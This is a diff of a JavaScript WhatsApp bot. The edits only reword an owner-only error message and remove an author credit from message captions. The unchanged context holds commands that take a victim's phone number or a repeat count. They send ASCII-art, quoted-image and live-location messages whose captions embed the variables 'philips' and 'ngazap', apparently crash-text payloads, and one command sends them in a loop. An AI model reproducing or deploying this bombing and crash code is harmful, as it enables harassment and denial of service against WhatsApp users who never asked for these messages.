+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ MOMO`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -6990,7 +7055,7 @@ for (let i = 0; i < jumlah; i++) {
             }
             break
           case 'kigasmomo': {            
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
            if (!text) throw `Nomernya mana?`       
              momoe = `
 ///....▓▓▓▓
@@ -7019,7 +7084,7 @@ for (let i = 0; i < jumlah; i++) {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ MOMO`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ MOMO`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -7053,7 +7118,7 @@ case 'mlm':
 case 'sore':
 case 'siang':
 case 'pagi': {            
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
              salem = `السلام عليكم
 `
              asukonyol11 = { 
@@ -7065,7 +7130,7 @@ case 'pagi': {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -7074,7 +7139,7 @@ await jobotz.sendMessage(m.chat, {text:salem},{quoted:asukonyol11})
 }
 break
 case 'kihello': {            
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
              halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
 ///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
 ///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
@@ -7092,7 +7157,7 @@ case 'kihello': {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -7109,7 +7174,7 @@ await jobotz.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
 }
             break
 case 'kihelloto': {            
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
           if (!text) throw `Nomernya mana?`
              halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
 ///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
@@ -7128,7 +7193,7 @@ case 'kihelloto': {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ HELLO`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ HELLO`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -7146,7 +7211,7 @@ await m.reply(`Berhasil Mengirim Hello Di Nomer ${text}`)
 }
             break
 case 'kigashello': {            
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
           if (!text) throw `Nomernya mana?`
              halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
 ///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
@@ -7165,7 +7230,7 @@ case 'kigashello': {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ HELLO`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ HELLO`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -7210,7 +7275,7 @@ await m.reply(`Berhasil Mengirim Hello Di Nomer ${text}`)
             }
             break
 case 'Kitengkorak': {            
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
              teng = `
 ██▀░░░░░░░░░░░░░▀██
 █│░░░░░░░░░░░░░░░│█
@@ -7237,7 +7302,7 @@ case 'Kitengkorak': {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -7254,7 +7319,7 @@ await jobotz.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
 }
             break
 case 'kitengkorakto': {            
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
              teng = `
 ██▀░░░░░░░░░░░░░▀██
@@ -7282,7 +7347,7 @@ if (!text) throw `Nomernya mana?`
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -7309,7 +7374,7 @@ await m.reply(`Berhasil Mengirim Tengkorak Di Nomer ${text}`)
             }
             break
 case 'kigastengkorak': {            
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
              teng = `
 ██▀░░░░░░░░░░░░░▀██
@@ -7337,7 +7402,7 @@ if (!text) throw `Nomernya mana?`
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -7382,14 +7447,14 @@ await jobotz.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
             }
             break
 case 'kigasliveloc': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let doc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
 var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 	"liveLocationMessage": {
 						"degreesLatitude": -6.9366881,
 						"degreesLongitude": 107.7228148,
-						"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${philips} ${ngazap(prefix)}`,
+						"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ${philips} ${ngazap(prefix)}`,
 						"sequenceNumber": "1657997490287001",
 						"jpegThumbnail": "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"
 }
@@ -7408,14 +7473,14 @@ await m.reply(`Berhasil Mengirim Liveloc Di Nomer ${text}`)
 }
 break
 case 'kilivelocto': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let doc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
 var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 	"liveLocationMessage": {
 						"degreesLatitude": -6.9366881,
 						"degreesLongitude": 107.7228148,
-						"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${philips} ${ngazap(prefix)}`,
+						"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ${philips} ${ngazap(prefix)}`,
 						"sequenceNumber": "1657997490287001",
 						"jpegThumbnail": "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"
 }
@@ -7429,7 +7494,7 @@ await m.reply(`Berhasil Mengirim liveloc Di Nomer ${text}`)
 }
 break
 case 'kiliveloc': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -7438,7 +7503,7 @@ var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 	"liveLocationMessage": {
 						"degreesLatitude": -6.9366881,
 						"degreesLongitude": 107.7228148,
-						"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${philips} ${ngazap(prefix)}`,
+						"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ${philips} ${ngazap(prefix)}`,
 						"sequenceNumber": "1657997490287001",
